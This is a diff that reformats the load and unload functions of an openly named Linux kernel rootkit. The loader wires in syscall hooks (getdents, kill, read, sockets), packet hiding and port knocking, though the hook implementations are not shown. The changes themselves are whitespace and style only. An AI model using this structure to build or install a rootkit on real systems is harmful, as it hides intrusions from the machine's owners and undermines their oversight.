@@ -39,41 +39,39 @@
  * Function called when loading the kernel module.
  * Prints a welcome-message and then does its magic.
  */
-int init_module (void)
+int init_module(void)
 {
 	int ret;
 
-	ROOTKIT_DEBUG("****************************************\n");	
+	ROOTKIT_DEBUG("****************************************\n");
 	ROOTKIT_DEBUG("Beginning rootkit loading procedure...\n");
-	ROOTKIT_DEBUG("****************************************\n");	
+	ROOTKIT_DEBUG("****************************************\n");
 
 	// TODO: change all these functions from void to int to relay success/failure
 	// TODO: remove as many parameters from the load functions as possible
 	// TODO: only load what is absolutely necessary for the rootkit to function at insertion
-	
+
 	initialize_control();
-	hook_getdents();	
-	hook_kill();	
+	hook_getdents();
+	hook_kill();
 	hook_sockets();
 	hook_read();
 	load_packet_hiding();
-	
+
 	/* load port knocking */
-	ret = load_port_knocking();	
-	if(ret < 0) {
-		ROOTKIT_DEBUG("Error while loading port knocking! Aborting insertion.\n");
+	ret = load_port_knocking();
+	if (ret < 0) {
+		ROOTKIT_DEBUG
+		    ("Error while loading port knocking! Aborting insertion.\n");
 		return ret;
 	}
-	
+
 	/* autoload functionality */
-	//ROOTKIT_DEBUG("****************************************\n");	
+	//ROOTKIT_DEBUG("****************************************\n");  
 	//ROOTKIT_DEBUG("Auto-loading functionality...\n");
 	//ROOTKIT_DEBUG("****************************************\n");
-	
-	
-	
 
-	ROOTKIT_DEBUG("****************************************\n");	
+	ROOTKIT_DEBUG("****************************************\n");
 	ROOTKIT_DEBUG("Loading was successful!\n");
 	ROOTKIT_DEBUG("****************************************\n");
 	return 0;
@@ -84,14 +82,13 @@ int init_module (void)
  * Prints a goodbye-message and restores the kernel to its
  * original form.
  */
-void cleanup_module (void)
+void cleanup_module(void)
 {
-	ROOTKIT_DEBUG("****************************************\n");	
+	ROOTKIT_DEBUG("****************************************\n");
 	ROOTKIT_DEBUG("Beginning rootkit unloading procedure...\n");
-	ROOTKIT_DEBUG("****************************************\n");	
+	ROOTKIT_DEBUG("****************************************\n");
 
 	// TODO: adapt all unload functions to only do something if they are loaded
-	
 
 	cleanup_control();
 	unload_packet_hiding();
@@ -104,9 +101,9 @@ void cleanup_module (void)
 
 	/* sleep for a bit to ensure all processes have left our functions */
 	msleep(500);
-	
+
 	/* Finally, log the unloading */
-	ROOTKIT_DEBUG("****************************************\n");	
+	ROOTKIT_DEBUG("****************************************\n");
 	ROOTKIT_DEBUG("Unloading was successful. Bye!\n");
-	ROOTKIT_DEBUG("****************************************\n");	
+	ROOTKIT_DEBUG("****************************************\n");
 }
